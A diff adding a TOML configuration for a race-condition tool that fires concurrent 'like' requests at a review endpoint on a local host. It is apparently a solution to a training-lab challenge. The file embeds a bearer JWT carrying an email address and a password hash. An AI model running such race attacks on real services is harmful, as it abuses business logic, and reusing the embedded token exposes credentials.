@@ -1,0 +1,14 @@
+# Multiple Likes
+# Save this as multiple-likes.toml
+# Get comment information from this endpoint first: http://localhost:3000/rest/products/<id>/reviews
+# Then repalce id values in body parameter of this file
+# You need to replace the bearer token as well
+# open browser dev tools, like any of the comment, then inspect the traffic to obtain a valid bearer token
+# Launch this file by doing ./racethweb multiple-likes.toml
+count = 3
+verbose = true
+[[requests]]
+    method = "POST"
+    url = "http://10.0.0.205:3000/rest/products/reviews"
+    body = "{\"id\":\"sreiZQtM6KWYwRozT\"}"
+    headers = ["Content-Type: application/json","Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4wLjAuMTc5IiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDEtMDUgMjI6MDY6MTAuODMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDEtMDYgMDE6Mjk6MTUuNTIwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2NzY3NzIzMX0.tobsJfpe0XabHqHqhPMGifJmUBwchANsMkoOw0fWCVUKp06GC2b1b5PJHADEIrf9L123ecJ_NG1gNa40v_SmRkhbAJkxd_UNqGfuMVOCefJbbOIMTQEK0MvT1ePR5458c99P9AJU59xypRa8vrSSr8Ce-aiJ6_ARL7fOUl0YkrA"]
